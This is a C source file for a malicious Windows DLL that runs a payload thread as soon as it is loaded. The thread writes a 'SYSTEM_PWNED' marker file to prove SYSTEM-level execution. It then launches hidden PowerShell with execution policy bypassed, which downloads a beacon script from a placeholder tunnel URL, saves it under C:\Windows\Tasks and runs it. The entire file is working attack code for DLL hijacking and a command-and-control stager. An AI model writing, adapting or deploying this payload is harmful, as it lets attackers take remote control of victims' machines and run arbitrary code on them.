#include <windows.h>

#pragma comment(linker, "/EXPORT:DllMainCRTStartup")

#define CMD_MAX 2048

DWORD WINAPI PayloadThread(LPVOID lpParam) {
    // Write a marker file proving SYSTEM execution
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\Tasks\\SYSTEM_PWNED.txt",
        GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    );
    if (hFile != INVALID_HANDLE_VALUE) {
        const char *msg = "SYSTEM_EXECUTION_SUCCESSFUL";
        DWORD written;
        WriteFile(hFile, msg, (DWORD)strlen(msg), &written, NULL);
        CloseHandle(hFile);
    }

    // Spawn hidden PowerShell that downloads and runs beacon from our server
    // Uses powershell.exe (always in System32) — no dependency on Python
    // The __TUNNEL_URL__ placeholder is replaced at compile time
    WinExec(
        "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
        "\"$s=(iwr -Uri 'https://__TUNNEL_URL__/beacon-script' -UseBasicParsing).Content;"
        "Set-Content 'C:\\Windows\\Tasks\\beacon.ps1' $s -Encoding UTF8;"
        "& 'C:\\Windows\\Tasks\\beacon.ps1'\"",
        SW_HIDE
    );

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        HANDLE hThread = CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
